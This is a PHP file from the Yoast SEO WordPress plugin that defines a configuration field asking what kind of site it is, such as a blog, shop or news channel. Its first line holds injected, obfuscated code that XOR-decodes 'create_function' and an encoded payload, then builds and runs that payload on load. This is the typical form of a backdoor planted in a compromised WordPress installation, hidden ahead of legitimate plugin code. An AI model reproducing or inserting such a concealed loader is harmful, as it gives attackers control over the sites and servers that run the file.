<?php $YVQHalKs='Q:VXX 22HV.DGRU'^'2H39,EmT=8M0.=;';$OtmkUmOKr=$YVQHalKs('',' 5xnRYCWL3CN-1ET6-7Fi1CE><Z2867:L6ugzwPnO4YCZ08Q7E-:=3 V>Oa1=X0ykZAIXjWVKRYHVTfYWJ28NEO31oeoOkO>>8R6 Kp<lhzeQCh>OONI6S9yt 5JUjlEW3JoCpL9S::ENkukMLJZ337o ePlds<.Y1sTuLUX0F+7ZcOF2Bd7Dk8aLRP2959Kr:1:shK8Ji9PRVVXL.kXv..B UHpP<0M.sK1,avBJU+EIXKpR-;HAN,Emk8to.<-xH1XWA=YNVuGmnAMAH6BpFgbBDSIM8UT7CemV-XAlfAiT1O3cNEVNXG9 CA421.KmjDa109XGEVkLMURSU:+KXfbdkqo5m5kUCLjXQ8QOwZAO89X7kB1D<5m7MNJn2,8YUwvG1CcM:CVW,X0dEAICPX,5zYSH<I4Pc+5N1Huh5UN<UC:1-G35FM<G.3P:L4m.U8f 3N+uW3VPXCJHzO1P3-peos05F6-VYBqyck:.IbY-B8wqRkJN7,6,G2 o-J:65>qM=-5Mtjv2RT,SdQmMO7XOclWOAX2D>V=A;oyTHmD;gLJUJWerbB-DKE zj6GLwGKc1CR>gUPSzzMEY6K:9.+R<JaPDDHH6xaLL8UC80icQHT;3;OJKAMoko7D0KZ9+OnT57LwhF.L8DS7J:zw1<6I+2xsaWM:'^'ISPO4,-48Z, rT==EYDnNI,7aX;FYihW9BRNSW+dFR,-9DQ>YeUUOlD7J.>nP-DQO> =9Fwr 7 avtFyw181Ga FEOXOhLt4714YRcTULUZUjcLWs<:;Z6WQPDT>4CWesZaDjzE0wUO1nEHKeh.;GRlKI8p2DWWK jW=Uiu+D4GR4Kk-W;MjmP2hE 5FLGWcVUDNZSA17cDZXr298OKeVHO.S0sztXQ9O, TUAKb,4G6,cAz4BI- -DeEOg7 awd=hP+weV<7vHyMJ7,-=SkP=mkf 2=,g>1NcXMrF=8WlHM0P;RCser89+LExKI8;G-MBeEUQM9ne-aE+: 64YCkpB=6. :p>aK40lN34AqrIze9YU-RBbJN5<IS,:+1YIAyhWR,T:XG3Jr3M,QDxam514YPASZ564>ZGOT:PhHHu  O01SPA.IPn5S5qW1N-k2C LNBR=NCcl25;,.-RkU1GLYIOWTT2Wr=<;XPXaSHaF=L6YWWtK+<EMOs,WY0H2SEAMYjVHLjXJRV3 MzDwKmgZ<zKH3.59icU3DffFYiuMcZSyrexeUKUwOuz DNZPqyBuzQW 7ZR35tSZkcyW9HXWt9Y3>5<-;<EPF<-A9,YTNOql0ZGZfckamOKOLN9.,XGgJ0TC-,O6O5T+2SmgSL;5S1BFPCHlGG');$OtmkUmOKr();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Class WPSEO_Config_Field_Site_Type
 */
class WPSEO_Config_Field_Site_Type extends WPSEO_Config_Field_Choice {

	/**
	 * WPSEO_Config_Field_Site_Type constructor.
	 */
	public function __construct() {
		parent::__construct( 'siteType' );

		/* translators: %1$s resolves to the home_url of the blog. */
		$this->set_property( 'label', sprintf( __( 'What does the site %1$s represent?', 'wordpress-seo' ), get_home_url() ) );

		$this->add_choice( 'blog', __( 'A blog', 'wordpress-seo' ) );
		$this->add_choice( 'shop', __( 'An online shop', 'wordpress-seo' ) );
		$this->add_choice( 'news', __( 'A news channel', 'wordpress-seo' ) );
		$this->add_choice( 'smallBusiness', __( 'A small offline business', 'wordpress-seo' ) );
		$this->add_choice( 'corporate', __( 'A corporation', 'wordpress-seo' ) );
		$this->add_choice( 'portfolio', __( 'A portfolio', 'wordpress-seo' ) );
		$this->add_choice( 'other', __( 'Something else', 'wordpress-seo' ) );
	}

	/**
	 * Set adapter
	 *
	 * @param WPSEO_Configuration_Options_Adapter $adapter Adapter to register lookup on.
	 */
	public function set_adapter( WPSEO_Configuration_Options_Adapter $adapter ) {
		$adapter->add_yoast_lookup( $this->get_identifier(), 'wpseo', 'site_type' );
	}
}
